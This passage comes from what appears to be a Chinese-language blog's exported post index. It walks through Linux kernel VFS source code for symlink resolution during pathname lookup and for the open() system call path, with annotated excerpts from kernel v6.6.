(read_seqcount_retry(&amp;path.dentry-&gt;d_seq, nd-&gt;next_seq)) return ERR_PTR(-ECHILD); if (unlikely(!inode)) return ERR_PTR(-ENOENT); &#125; else &#123; dput(nd-&gt;path.dentry); if (nd-&gt;path.mnt != path.mnt) mntput(nd-&gt;path.mnt); &#125; nd-&gt;path = path; nd-&gt;inode = inode; nd-&gt;seq = nd-&gt;next_seq; return NULL; &#125; if (nd-&gt;flags &amp; LOOKUP_RCU) &#123; /* make sure that d_is_symlink above matches inode */ if (read_seqcount_retry(&amp;path.dentry-&gt;d_seq, nd-&gt;next_seq)) return ERR_PTR(-ECHILD); &#125; else &#123; if (path.mnt == nd-&gt;path.mnt) mntget(path.mnt); &#125; return pick_link(nd, &amp;path, inode, flags);&#125; 在step_into()中首先调用了handle_mounts()处理挂载点，如果在上面的walk_component()中找到的dentry是一个挂载点，则会进入到对应的文件系统中。 下面判断这个dentry是不是一个符号链接。如果是符号链接则会调用pick_link()对符号链接进行处理，如果不是符号链接，则会将nameidata更新为查找到的组件的信息，然后返回NULL。 如果是符号链接则会返回符号链接的字符串，后文详细讨论符号链接的处理。 现在假设我们查找到的组件不是符号链接，这个时候会返回一个NULL，一步步返回link_path_walk() 123456789101112131415 if (unlikely(link)) &#123; if (IS_ERR(link)) return PTR_ERR(link); /* a symlink to follow */ nd-&gt;stack[depth++].name = name; name = link; continue;&#125;if (unlikely(!d_can_lookup(nd-&gt;path.dentry))) &#123; if (nd-&gt;flags &amp; LOOKUP_RCU) &#123; if (!try_to_unlazy(nd)) return -ECHILD; &#125; return -ENOTDIR;&#125; 因为刚才我们的link返回的是一个NULL，所以不需要更新name，如果是符号链接的话，link则将会是一个字符串，我们需要将name更新为link，因为link是NULL，所以我们只需要对现在查找到的节点进行验证然后进行下一步循环。 比如说我们是绝对路径查找，查找的路径名为&#x2F;usr&#x2F;my&#x2F;helloworld.txt，在第一轮循环之后，nameidata的相关信息从根目录的信息更新为了usr的相关信息，而下一轮循环中，name的指针指向了m，也就是下一轮处理的name为my&#x2F;helloworld.txt，接下来会一步步循环处理直到处理到最后一个组件。 如果处理到最后一个组件 12345678910 /* pathname or trailing symlink, done */if (!depth) &#123; nd-&gt;dir_vfsuid = i_uid_into_vfsuid(idmap, nd-&gt;inode); nd-&gt;dir_mode = nd-&gt;inode-&gt;i_mode; nd-&gt;flags &amp;= ~LOOKUP_PARENT; return 0;&#125;/* last component of nested symlink */name = nd-&gt;stack[--depth].name;link = walk_component(nd, 0); 则会进行上述的操作。 我们在走到一个符号链接的时候，depth会+1，而处理完一个符号链接，depth会-1。 继续看下面的代码： 123456789101112131415161718192021222324 if (unlikely(!*name)) &#123;OK: /* pathname or trailing symlink, done */ if (!depth) &#123; nd-&gt;dir_vfsuid = i_uid_into_vfsuid(idmap, nd-&gt;inode); nd-&gt;dir_mode = nd-&gt;inode-&gt;i_mode; nd-&gt;flags &amp;= ~LOOKUP_PARENT; return 0; &#125; /* last component of nested symlink */ name = nd-&gt;stack[--depth].name; // 在这里说明已经处理完一个符号链接 link = walk_component(nd, 0); &#125; else &#123; /* not the last component */ link = walk_component(nd, WALK_MORE); &#125; if (unlikely(link)) &#123; if (IS_ERR(link)) return PTR_ERR(link); /* a symlink to follow */ nd-&gt;stack[depth++].name = name; // 在这里说明遇到了一个符号链接 name = link; continue; &#125; 如果所有符号链接都处理完成，并且是最后一个组件，则会返回0，最后一个组件会留给调用者进行处理。 最后的nameidata中的path是倒数第二个组件的相关信息，last是最后一个组件的相关信息。 符号链接处理为了理解符号链接的处理，首先要理解几个基本问题：符号链接栈，符号链接缓存的生命周期，这将帮助我们理解符号链接的整体递归处理和对最终组件进行的特殊处理。 符号链接栈只有两种文件系统对象可以有效的出现在最终组件之前的路径中：目录和符号链接 处理目录非常简单：解释为路径上下一个组件的新起点。 处理符号链接需要更多的操作。 可以通过编辑路径名成来处理符号链接。如果一个组件引用了符号链接，则将该组件替换为链接的正文。如果该正文是一个以“&#x2F;”开头的绝对路径，则丢弃路径前面的所有部分。也就是说比如我要查找&#x2F;home&#x2F;user&#x2F;project&#x2F;symlinks&#x2F;src&#x2F;main.cpp ，然后现在有一个符号链接&#x2F;home&#x2F;user&#x2F;project&#x2F;symlinks&#x2F;src -&gt; &#x2F;home&#x2F;data&#x2F;123123&#x2F;456,那么最终找到的文件是&#x2F;home&#x2F;data&#x2F;123123&#x2F;456&#x2F;main.cpp。 但是在pathname lookup的过程中，丢弃之前的路径没有必要，因为走到下面的路径的时候就不会再回头看之前的路径了。所以重要的是跟踪所有剩余的组件，他们也可以单独保存起来，不需要将他们连接起来，也就是单独存储每一个组件而不是存储成一个用&#x2F;链接起来的字符串也是可以的。 因为一个符号链接可以很容易的引用另一个符号链接，然后引用的另一个符号链接还可以轻松的引用第三个符号链接，所以再查找的过程中，首先要将第一个符号链接前查找的剩余组件保存，而第二个符号链接查找前的剩余组件我们也要保存起来，依次类推，我们可能需要保存多个路径的剩余组件，这也对应我们上面的代码分析，nd-&gt;stack[depth]操作。每个组件将在需要处理完的路径处理完之后进行处理，这些剩余的路径保存在栈中。 而保存剩余路径的栈的长度是有限的。为了限制单个路径查找中可以出现的符号链接数。首先可以避免出现循环，如果符号链接直接引用自己或者通过中介引用自己，那么符号链接就永远没法完成，所以要返回错误。第二个原因是Because it&#39;s a latency and DoS issue too. We need to react well to true loops, but also to &quot;very deep&quot; non-loops. It&#39;s not about memory use, it&#39;s about users triggering unreasonable CPU resources. Linux 对任何路径名的长度施加了限制： PATH_MAX ，即 4096。此限制的原因有很多;不要让内核在一条路径上花费太多时间就是其中之一。使用符号链接，可以有效地生成更长的路径，因此出于同样的原因需要某种限制。 Linux 在任何一个路径查找中最多施加了 40 个 （MAXSYMLINKS） 符号链接的限制。它之前对递归的最大深度施加了 8 个限制，但当实现单独的堆栈时，这个限制提高到 40，所以现在只有一个限制。 我们在上文中遇到的 nameidata 结构包含一个小堆栈，可用于存储最多两个符号链接的剩余部分。在许多情况下，这就足够了。如果不是，则分配一个单独的堆栈，其中包含 40 个符号链接的空间。路径名查找永远不会超过该堆栈，因为一旦检测到第 40 个符号链接，就会返回错误。 符号链接缓存的生命周期与其他文件系统资源一样（比如inode和dentry），符号链接也有缓存，以避免重复访问外部存储，成本高昂。 对于RCU-walk来说，能够找到并且暂时保留这些缓存的条目非常重要，这样就不需要进入到REF-walk中。 虽然每个文件系统都可以自由选择，但是符号链接通常存储在两个位置之一。 inode - 一般存储短符号链接。 当文件系统分配一个inode结构体时，它通常会分配额外的空间来存储私有数据（内核中常见的 object-oriented design pattern 面向对象设计。这有时候会包含符号链接的空间。 当符号链接存储在inode中时，符号链接与inode具有相同的生命周期，而inode本身受RCU或者dentry上的引用计数保护，这意味pathname lookup用于安全访问dcache和icache的机制就足以安全的访问某些符号链接cache，在这些情况下，inode中的i_link指针设置为指向符号链接的存储位置，并且在需要时可以直接访问它。 page cache - 一般存储文件的内容 符号链接中的路径名可以看作是符号链接的内容，并且可以像文件内容一样轻松地存储在page cache中。 文件系统分配临时内存 当上面两种情况都不合适时，下一个最有可能的情况是文件系统将分配一些临时内存，并在需要时将符号链接内容复制或构造到该内存中。 当符号链接存储在page cache或者其他地方时，情况就不是那么简单了。对于dentry和inode的引用并不意味着对这个inode的page cache的引用，甚至rcu_read_lock()不足以确保页面是否会消失。因此对于这种符号链接，pathname lookup要求文见系统提供稳定的引用，并且重要的是在完成引用时释放该引用。 即使在RCU遍历模式下，通常也可以引用page cache，它确实需要对内存进行更改，但是最好避免这种情况。 分配空间将符号链接复制到文件系统中，可以用GFP_ATOMIC成功分配内存而不需要推出RCU遍历。如果文件系统在RCU模式不能成功获取引用，则必须返回-ECHILD并且调用unlazy_walk()，退出到REF模式中，在该模式下，允许文件系统sleep。 发生上面所述的地方是inode的方法i_op-&gt;get_link()。这个方法在RCU和REF中都可以调用，在RCU中dentry*参数是NULL，-&gt;get_link()会返回-ECHILD来退出到RCU模式。就像i_op-&gt;permission()方法，-&gt;get_link()需要注意它的所有数据是否可以安全访问同时不保留引用计数。一个回调函数struct delayed_called将传递给-&gt;get_link()：文件系统可以通过set_delayed_call()来设置自己的put_link()函数和参数。之后，当VFS想释放符号链接时，它将调用do_delayed_call()来调用带有参数的回调函数。 为了在遍历时删除对每个符号链接的引用，无论是在RCU还是在REF中，符号链接栈都需要包含以下 123456struct saved &#123; struct path link; //对上一个路径的引用 struct delayed_call done; //以后调用 const char *name; //对上一个名称的引用 unsigned seq; //允许path安全的从RCU切换到REF &#125; *stack 这意味着符号链接栈中的每个条目都需要保存五个指针和一个整数，指针指向路径剩余的组件，它是符号链接被完全解析完之后，要继续walk的组件。在 64 位系统上，每个条目大约有 40 个字节;有 40 个条目，它总共加起来有 1600 个字节，不到半页。 遍历符号链接 在link_path_walk()的主循环中迭代所有的组件和非最终组件的符号链接，在处理符号链接时，name指针指向一个新的符号链接或者从栈中恢复之前的剩余组件，具体分析看link_path_walk的部分。 找到符号链接后，walk_component()通过step_into()调用pick_link()，pick_link()从文件系统中返回符号链接，如果操作成功，之前路径的name将会压入栈中，新的值会作为name继续遍历，当新的name遍历完之后，旧的name会从堆栈中恢复，遍历继续进行。 当最后符号链接的最后一个组件是符号链接时，最方便的做法是，在walk_component()中找到符号链接时，立即将其压入栈中，walk_component() 在遍历组件时，当发现符号链接时，最方便的方法是将新的符号链接引用立即推到 walk_component() 中的堆栈上；walk_component() 也是需要查看旧符号链接的最后一段代码，因为它遍历的是最后一个组件。因此，对于 walk_component() 来说，在推送新符号链接的引用信息之前释放旧的符号链接并弹出引用非常方便。这由三个标志进行引导：WALK_NOFOLLOW，如果找到符号链接，则禁止跟踪它；WALK_MORE，表示现在释放当前符号链接还为时过早；WALK_TRAILING，表示它位于查找的最后一个组件上，因此我们将检查用户空间标志 LOOKUP_FOLLOW 以决定是否跟踪它（如果它是一个符号链接），并调用 may_follow_link() 来检查我们是否有权限跟踪它。 没有最终组件的符号链接一种特殊情况的符号链接需要进一步分析，这种情况会导致pick_link()返回NULL 指向“&#x2F;”的符号链接： 当一个符号链接的内容仅仅是“&#x2F;”（根目录）时，系统通过pick_link()函数会识别出这种特殊情况。 在这种情况下，nameidata（一个用于记录路径信息的结构体）会被重置为指向文件系统的有效根目录。 因为路径中没有任何其他组件，所以pick_link()函数返回NULL，表示符号链接已经被处理完，可以释放相关的资源。 &#x2F;proc中的“魔术链接”（magic links）： 在Linux中，/proc是一个虚拟文件系统，主要用于访问内核和进程信息。 每一个打开的文件描述符在/proc中都有一个对应的表示，看起来像一个符号链接。但实际上，这些“链接”是对目标文件的直接引用，而不仅仅是文件名。 当读取这些“链接”时，返回的是可能指向同一个文件的名称，除非该文件已经被删除或被其他挂载点覆盖。 当系统尝试解析这些“魔术链接”时，它不会像处理常规符号链接那样返回一个字符串名称。相反，它会直接更新nameidata以指向目标文件，然后返回NULL。这样，pick_link()函数再次返回NULL，因为没有更多的路径组件需要处理。","categories":[{"name":"Linux内核","slug":"Linux内核","permalink":"http://example.com/categories/Linux%E5%86%85%E6%A0%B8/"},{"name":"VFS","slug":"Linux内核/VFS","permalink":"http://example.com/categories/Linux%E5%86%85%E6%A0%B8/VFS/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"}]},{"title":"学习 Linux VFS虚拟文件系统 打开文件","slug":"学习-Linux-VFS虚拟文件系统-打开文件","date":"2023-11-22T02:12:34.000Z","updated":"2023-12-15T06:55:10.737Z","comments":true,"path":"2023/11/22/学习-Linux-VFS虚拟文件系统-打开文件/","link":"","permalink":"http://example.com/2023/11/22/%E5%AD%A6%E4%B9%A0-Linux-VFS%E8%99%9A%E6%8B%9F%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F-%E6%89%93%E5%BC%80%E6%96%87%E4%BB%B6/","excerpt":"分析Linux内核中打开文件的源码 OPEN系统调用open.c - fs&#x2F;open.c - Linux source code (v6.6) - Bootlin","text":"分析Linux内核中打开文件的源码 OPEN系统调用open.c - fs&#x2F;open.c - Linux source code (v6.6) - Bootlin 123456SYSCALL_DEFINE3(open, const char __user *, filename, int, flags, umode_t, mode)&#123; if (force_o_largefile()) flags |= O_LARGEFILE; return do_sys_open(AT_FDCWD, filename, flags, mode);&#125; open（） 系统调用打开由 pathname 指定的文件。如果指定的文件不存在，则可以选择（如果在标志中指定了O_CREAT）由 open（） 创建。 open（） 的返回值是一个文件描述符，一个小的非负整数，是进程的打开文件描述符表中条目的索引。文件描述符用于后续系统调用（read（2）、write（2）、lseek（2）、fcntl（2） 等）来指代打开的文件。成功调用返回的文件描述符将是当前未为进程打开的最低编号的文件描述符。 如果 pathname 中给出的路径名是相对路径，而 dirfd 是特殊值 AT_FDCWD，则 pathname 是相对于调用进程的当前工作目录解释的（如 open（））。 openat2（2）系统调用是 openat（） 的扩展，它提供了 openat（） 特性的超集。 1234567891011121314151617181920212223242526272829303132SYSCALL_DEFINE4(openat, int, dfd, const char __user *, filename, int, flags, umode_t, mode)&#123; if (force_o_largefile()) flags |= O_LARGEFILE; return do_sys_open(dfd, filename, flags, mode);&#125;SYSCALL_DEFINE4(openat2, int, dfd, const char __user *, filename, struct open_how __user *, how, size_t, usize)&#123; int err; struct open_how tmp; BUILD_BUG_ON(sizeof(struct open_how) &lt; OPEN_HOW_SIZE_VER0); BUILD_BUG_ON(sizeof(struct open_how) != OPEN_HOW_SIZE_LATEST); if (unlikely(usize &lt; OPEN_HOW_SIZE_VER0)) return -EINVAL; err = copy_struct_from_user(&amp;tmp, sizeof(tmp), how, usize); if (err) return err; audit_openat2_how(&amp;tmp); /* O_LARGEFILE is only allowed for non-O_PATH. */ if (!(tmp.flags &amp; O_PATH) &amp;&amp; force_o_largefile()) tmp.flags |= O_LARGEFILE; return do_sys_openat2(dfd, filename, &amp;tmp);&#125; 在之后的文章中会详细分析open系统调用，本文主要分析打开文件的源码和VFS中打开文件的流程分析。 do_sys_openopen.c - fs&#x2F;open.c - Linux source code (v6.6) - Bootlin 123456789// 定义一个名为 do_sys_open 的函数，该函数接受四个参数：dfd（目录文件描述符），filename（文件名），flags（标志）和 mode（模式）long do_sys_open(int dfd, const char __user *filename, int flags, umode_t mode)&#123; // 使用 build_open_how 函数根据 flags 和 mode 参数构造一个 open_how 结构体 struct open_how how = build_open_how(flags, mode); // 调用 do_sys_openat2 函数，传入 dfd（目录文件描述符）、filename 和 how 结构体的指针 return do_sys_openat2(dfd, filename, &amp;how);&#125; do_sys_openat2 open.c - fs&#x2F;open.c - Linux source code (v6.6) - Bootlin 123456789101112131415161718192021222324252627282930313233343536373839404142// 定义一个名为 do_sys_openat2 的静态函数，该函数接受三个参数：dfd（目录文件描述符），filename（文件名）和 how（打开方式结构体指针）static long do_sys_openat2(int dfd, const char __user *filename, struct open_how *how)&#123; struct open_flags op; // 使用 build_open_flags 函数根据 how 结构体构造一个 open_flags 结构体，将结果存储在 op 变量中 int fd = build_open_flags(how, &amp;op); struct filename *tmp; // 如果 fd 不为 0（表示出错），则返回 fd if (fd) return fd; // 使用 getname 函数获取 filename 参数的内核空间副本，并将其存储在 tmp 变量中 tmp = getname(filename); // 如果获取文件名出错，返回错误码 if (IS_ERR(tmp)) return PTR_ERR(tmp); // 根据 how-&gt;flags 获取未使用的文件描述符（fd），并将其存储在 fd 变量中 fd = get_unused_fd_flags(how-&gt;flags); // 如果 fd 大于等于 0（表示未使用的文件描述符可用） if (fd &gt;= 0) &#123; // 使用 do_filp_open 函数打开文件，传入 dfd（目录文件描述符）、tmp（文件名）和 op（打开方式）参数 struct file *f = do_filp_open(dfd, tmp, &amp;op); // 如果打开文件出错，释放未使用的文件描述符并返回错误码 if (IS_ERR(f)) &#123; put_unused_fd(fd); fd = PTR_ERR(f); &#125; else &#123; // 如果打开文件成功，调用 fsnotify_open 函数通知相关子系统 fsnotify_open(f); // 调用 fd_install 函数将文件描述符 fd 与打开的文件结构体 f 关联起来 fd_install(fd, f); &#125; &#125; // 释放 tmp 变量（即 filename 的内核空间副本） putname(tmp); // 返回文件描述符 fd return fd;&#125; get_unused_fd_flags获取文件描述符 getname函数主要功能是在使用文件名之前将其拷贝到内核数据区，正常结束时返回内核分配的空间首地址，出错时返回错误代码 do_filp_open进行实际打开文件操作 do_filp_opennamei.c - fs&#x2F;namei.c - Linux source code (v6.6) - Bootlin 123456789101112131415161718192021222324// 定义一个名为 do_filp_open 的函数，该函数接受三个参数：dfd（目录文件描述符），pathname（文件名结构体指针）和 op（打开方式结构体指针）struct file *do_filp_open(int dfd, struct filename *pathname, const struct open_flags *op)&#123; struct nameidata nd; // 从 op 结构体中获取查找标志 int flags = op-&gt;lookup_flags; struct file *filp; // 使用 set_nameidata 函数初始化 nd 结构体，传入 dfd（目录文件描述符）、pathname（文件名结构体指针）和 NULL（用于初始化 nd-&gt;intent） set_nameidata(&amp;nd, dfd, pathname, NULL); // 使用 path_openat 函数尝试打开文件，传入 nd（名字数据结构体）、op（打开方式结构体）和 flags（查找标志）；使用 LOOKUP_RCU 标志进行 RCU 优化 filp = path_openat(&amp;nd, op, flags | LOOKUP_RCU); // 如果文件打开失败并返回 -ECHILD 错误码，表明 RCU 优化失败，尝试使用非 RCU 优化方式打开文件 if (unlikely(filp == ERR_PTR(-ECHILD))) filp = path_openat(&amp;nd, op, flags); // 如果文件打开失败并返回 -ESTALE 错误码，表明文件系统状态陈旧，尝试使用 LOOKUP_REVAL 标志重新评估文件系统状态并打开文件 if (unlikely(filp == ERR_PTR(-ESTALE))) filp = path_openat(&amp;nd, op, flags | LOOKUP_REVAL); // 通过调用 restore_nameidata 函数恢复名字数据结构体（nd）的状态 restore_nameidata(); // 返回文件结构体指针 filp return filp;&#125; set_nameidata初始化nameidata结构体，nameidata结构体存储pathname lookup的中间结果 path_openat进行实际的打开文件操作 path_openatnamei.c - fs&#x2F;namei.c - Linux source code (v6.6) - Bootlin 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253// 定义一个名为 path_openat 的静态函数，该函数接受三个参数：nd（名字数据结构体指针）、op（打开方式结构体指针）和 flags（打开标志）static struct file *path_openat(struct nameidata *nd, const struct open_flags *op, unsigned flags)&#123; struct file *file; int error; // 使用 alloc_empty_file 函数分配一个空的文件结构体，传入打开标志和当前进程的认证信息 file = alloc_empty_file(op-&gt;open_flag, current_cred()); // 如果分配文件结构体失败，返回错误指针 if (IS_ERR(file)) return file; // 如果文件打开标志包含 __O_TMPFILE，调用 do_tmpfile 函数处理临时文件的打开操作 if (unlikely(file-&gt;f_flags &amp; __O_TMPFILE)) &#123; error = do_tmpfile(nd, flags, op, file); // 如果文件打开标志包含 O_PATH，调用 do_o_path 函数处理 O_PATH 标志的打开操作 &#125; else if (unlikely(file-&gt;f_flags &amp; O_PATH)) &#123; error = do_o_path(nd, flags, file); // 否则，正常处理文件打开操作 &#125; else &#123; // 使用 path_init 函数初始化 nd 结构体，并返回路径名字符串 s const char *s = path_init(nd, flags); // 循环调用 link_path_walk 和 open_last_lookups 函数，直到路径名解析完成 while (!(error = link_path_walk(s, nd)) &amp;&amp; (s = open_last_lookups(nd, file, op)) != NULL) ; // 路径名解析完成后，调用 do_open 函数处理文件打开操作 if (!error) error = do_open(nd, file, op); // 调用 terminate_walk 函数终止路径名解析操作 terminate_walk(nd); &#125; // 如果没有错误发生，返回文件结构体指针 if (likely(!error)) &#123; if (likely(file-&gt;f_mode &amp; FMODE_OPENED)) return file; WARN_ON(1); error = -EINVAL; &#125; // 如果有错误发生，释放文件结构体并返回错误指针 fput(file); // 如果错误码为 -EOPENSTALE，根据 flags 参数设置错误码为 -ECHILD 或 -ESTALE if (error == -EOPENSTALE) &#123; if (flags &amp; LOOKUP_RCU) error = -ECHILD; else error = -ESTALE; &#125; return ERR_PTR(error);&#125; 在path_init中根据pathname是绝对路径还是相对路径进行不同的设置 之前将nd-&gt;name-&gt;name设置为查找的pathname了 nd-&gt;path,nd-&gt;inode在查找之前都设置为查找的起点相关的信息，绝对路径则设置为root的，相对路径则设置为当前目录的 nd-&gt;root如果是绝对路径查找则会设置为fs的根目录，如果是相对路径查找，则不会设置（不确定） 接下来进入pathname lookup阶段，后面会写文章详细分析pathname lookup 在pathname lookup阶段，如果找到文件，则do_open在open_last_lookup之后用来打开文件，如果在dcache中找到对应的文件，则vfs_open用于打开文件，如果没有，则在lookup_open中进行具体文件系统的i_op-&gt;lookup或i_op-&gt;create来进行查找或者重新创建文件，在第二种情况下，这个新找到的文件或创建的文件的实际打开操作将由vfs_open执行 do_open在pathname lookup之后，struct nameidata会设置为查找到的最终的结果， 1234567891011121314151617181920212223struct nameidata &#123; struct path path; struct qstr last; struct path root; struct inode *inode; /* path.dentry.d_inode */ unsigned int flags, state; unsigned seq, next_seq, m_seq, r_seq; int last_type; unsigned depth; int total_link_count; struct saved &#123; struct path link; struct delayed_call done; const char *name; unsigned seq; &#125; *stack, internal[EMBEDDED_LEVELS]; struct filename *name; struct nameidata *saved; unsigned root_seq; int dfd; vfsuid_t dir_vfsuid; umode_t dir_mode;&#125; __randomize_layout; namei.c - fs&#x2F;namei.c - Linux source code (v6.6) - Bootlin 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960/* * Handle the last step of open() */static int do_open(struct nameidata *nd, struct file *file, const struct open_flags *op)&#123; struct mnt_idmap *idmap; int open_flag = op-&gt;open_flag; bool do_truncate; int acc_mode; int error; if (!(file-&gt;f_mode &amp; (FMODE_OPENED | FMODE_CREATED))) &#123; error = complete_walk(nd); if (error) return error; &#125; if (!(file-&gt;f_mode &amp; FMODE_CREATED)) audit_inode(nd-&gt;name, nd-&gt;path.dentry, 0); idmap = mnt_idmap(nd-&gt;path.mnt); if (open_flag &amp; O_CREAT) &#123; if ((open_flag &amp; O_EXCL) &amp;&amp; !(file-&gt;f_mode &amp; FMODE_CREATED)) return -EEXIST; if (d_is_dir(nd-&gt;path.dentry)) return -EISDIR; error = may_create_in_sticky(idmap, nd, d_backing_inode(nd-&gt;path.dentry)); if (unlikely(error)) return error; &#125; if ((nd-&gt;flags &amp; LOOKUP_DIRECTORY) &amp;&amp; !d_can_lookup(nd-&gt;path.dentry)) return -ENOTDIR; do_truncate = false; acc_mode = op-&gt;acc_mode; if (file-&gt;f_mode &amp; FMODE_CREATED) &#123; /* Don&#x27;t check for write permission, don&#x27;t truncate */ open_flag &amp;= ~O_TRUNC; acc_mode = 0; &#125; else if (d_is_reg(nd-&gt;path.dentry) &amp;&amp; open_flag &amp; O_TRUNC) &#123; error = mnt_want_write(nd-&gt;path.mnt); if (error) return error; do_truncate = true; &#125; error = may_open(idmap, &amp;nd-&gt;path, acc_mode, open_flag); if (!error &amp;&amp; !(file-&gt;f_mode &amp; FMODE_OPENED)) error = vfs_open(&amp;nd-&gt;path, file); if (!error) error = ima_file_check(file, op-&gt;acc_mode); if (!error &amp;&amp; do_truncate) error = handle_truncate(idmap, file); if (unlikely(error &gt; 0)) &#123; WARN_ON(1); error = -EINVAL; &#125; if (do_truncate) mnt_drop_write(nd-&gt;path.mnt); return error;&#125; vfs_open进行实际的文件打开操作，对file结构体进行了设置 vfs_open12345678910/** * vfs_open - open the file at the given path * @path: path to open * @file: newly allocated file with f_flag initialized */int vfs_open(const struct path *path, struct file *file)&#123; file-&gt;f_path = *path; return do_dentry_open(file, d_backing_inode(path-&gt;dentry), NULL);&#125; 往下调用了do_dentry_open函数进行对file结构体的设置 do_dentry_openopen.c - fs&#x2F;open.c - Linux source code (v6.6) - Bootlin 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136static int do_dentry_open(struct file *f, struct inode *inode, int (*open)(struct inode *, struct file *))&#123; // 声明一个空的文件操作结构 static const struct file_operations empty_fops = &#123;&#125;; int error; // 增加路径的引用计数 path_get(&amp;f-&gt;f_path); // 设置文件的 inode f-&gt;f_inode = inode; // 设置文件的地址空间（映射） f-&gt;f_mapping = inode-&gt;i_mapping; // 从文件的地址空间中获取写回错误样本 f-&gt;f_wb_err = filemap_sample_wb_err(f-&gt;f_mapping); // 从文件中获取超级块错误样本 f-&gt;f_sb_err = file_sample_sb_err(f); // 检查文件是否以 O_PATH 标志打开，如果是，则设置文件模式和操作 if (unlikely(f-&gt;f_flags &amp; O_PATH)) &#123; f-&gt;f_mode = FMODE_PATH | FMODE_OPENED; f-&gt;f_op = &amp;empty_fops; return 0; &#125; // 如果文件以读模式打开，增加读取计数 if ((f-&gt;f_mode &amp; (FMODE_READ | FMODE_WRITE)) == FMODE_READ) &#123; i_readcount_inc(inode); // 如果文件以写模式打开且不是特殊文件，授予写访问权限 &#125; else if (f-&gt;f_mode &amp; FMODE_WRITE &amp;&amp; !special_file(inode-&gt;i_mode)) &#123; error = get_write_access(inode); if (unlikely(error)) goto cleanup_file; error = __mnt_want_write(f-&gt;f_path.mnt); if (unlikely(error)) &#123; put_write_access(inode); goto cleanup_file; &#125; f-&gt;f_mode |= FMODE_WRITER; &#125; // 为常规文件和目录启用原子位置 if (S_ISREG(inode-&gt;i_mode) || S_ISDIR(inode-&gt;i_mode)) f-&gt;f_mode |= FMODE_ATOMIC_POS; /* 设置其他f_mode标志,获取shmem_file_operations作为f_op */ f-&gt;f_op = fops_get(inode-&gt;i_fop); if (WARN_ON(!f-&gt;f_op)) &#123; error = -ENODEV; goto cleanup_all; &#125; /* 调用security_file_open()和break_lease() */ error = security_file_open(f); if (error) goto cleanup_all; // 检查文件上是否存在需要中断的活动租约 error = break_lease(file_inode(f), f-&gt;f_flags); if (error) goto cleanup_all; // 为寻找、pread 和 pwrite 设置默认文件模式标志 f-&gt;f_mode |= FMODE_LSEEK | FMODE_PREAD | FMODE_PWRITE; // 使用文件操作提供的 open 函数，如果未提供，则使用默认值 if (!open) open = f-&gt;f_op-&gt;open; if (open) &#123; error = open(inode, f); if (error) goto cleanup_all; &#125; // 设置文件模式标志以表示文件已打开 f-&gt;f_mode |= FMODE_OPENED; // 根据相应操作的可用性设置读写能力 if ((f-&gt;f_mode &amp; FMODE_READ) &amp;&amp; likely(f-&gt;f_op-&gt;read || f-&gt;f_op-&gt;read_iter)) f-&gt;f_mode |= FMODE_CAN_READ; if ((f-&gt;f_mode &amp; FMODE_WRITE) &amp;&amp; likely(f-&gt;f_op-&gt;write || f-&gt;f_op-&gt;write_iter)) f-&gt;f_mode |= FMODE_CAN_WRITE; // 如果 llseek 操作不可用，则禁用寻找 if ((f-&gt;f_mode &amp; FMODE_LSEEK) &amp;&amp; !f-&gt;f_op-&gt;llseek) f-&gt;f_mode &amp;= ~FMODE_LSEEK; // 如果地址空间操作支持，则启用直接 I/O if (f-&gt;f_mapping-&gt;a_ops &amp;&amp; f-&gt;f_mapping-&gt;a_ops-&gt;direct_IO) f-&gt;f_mode |= FMODE_CAN_ODIRECT; // 清除不必要的打开标志 f-&gt;f_flags &amp;= ~(O_CREAT | O_EXCL | O_NOCTTY | O_TRUNC); // 为文件设置 iocb 标志 f-&gt;f_iocb_flags = iocb_flags(f); // 初始化文件的预读状态 file_ra_state_init(&amp;f-&gt;f_ra, f-&gt;f_mapping-&gt;host-&gt;i_mapping); // 如果请求 O_DIRECT 但不支持，则返回错误 if ((f-&gt;f_flags &amp; O_DIRECT) &amp;&amp; !(f-&gt;f_mode &amp; FMODE_CAN_ODIRECT)) return -EINVAL; // 如果文件以写模式打开，请确保不使用巨大的页面缓存 if (f-&gt;f_mode &amp; FMODE_WRITE) &#123; smp_mb(); // 为后续操作确保内存排序 // 检查页面缓存中是否有任何巨大的页面 if (filemap_nr_thps(inode-&gt;i_mapping)) &#123; struct address_space *mapping = inode-&gt;i_mapping; // 锁定页面缓存并使其无效 filemap_invalidate_lock(inode-&gt;i_mapping); // 取消映射文件的内存范围 unmap_mapping_range(mapping, 0, 0, 0); // 截断页面缓存中的 inode 页面 truncate_inode_pages(mapping, 0); // 解锁页面缓存 filemap_invalidate_unlock(inode-&gt;i_mapping); &#125; &#125; return 0;cleanup_all: // 检查无效的正错误代码并重置为 -EINVAL if (WARN_ON_ONCE(error &gt; 0)) error = -EINVAL; // 释放文件操作结构 fops_put(f-&gt;f_op); // 释放文件访问 put_file_access(f);cleanup_file: // 减少路径的引用计数并清除文件的路径和 inode path_put(&amp;f-&gt;f_path); f-&gt;f_path.mnt = NULL; f-&gt;f_path.dentry = NULL; f-&gt;f_inode = NULL; return error;&#125; f-&gt;f_op-&gt;open具体文件系统的文件打开操作函数file_operations 参考资料 open(2) - Linux manual page — open（2） - Linux 手册页 (man7.org)","categories":[{"name":"Linux内核","slug":"Linux内核","permalink":"http://example.com/categories/Linux%E5%86%85%E6%A0%B8/"},{"name":"VFS","slug":"Linux内核/VFS","permalink":"http://example.com/categories/Linux%E5%86%85%E6%A0%B8/VFS/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"}]},{"title":"学习 Linux 文件系统 实现原理","slug":"学习-Linux-文件系统-实现原理","date":"2023-11-22T01:45:03.000Z","updated":"2023-11-22T02:11:48.489Z","comments":true,"path":"2023/11/22/学习-Linux-文件系统-实现原理/","link":"","permalink":"http://example.com/2023/11/22/%E5%AD%A6%E4%B9%A0-Linux-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F-%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/","excerpt":"实现文件系统的可加载模块必须在加载时向 VFS 层注册该文件系统，文件系统可能是以内核模块的形式存在（不确定） 前面的文章中分析了vfs和tmpfs文件系统，但是tmpfs作为文件系统比较特殊，所以本文以ext4文件系统来分析文件系统的实现原理。 注册文件系统","text":"实现文件系统的可加载模块必须在加载时向 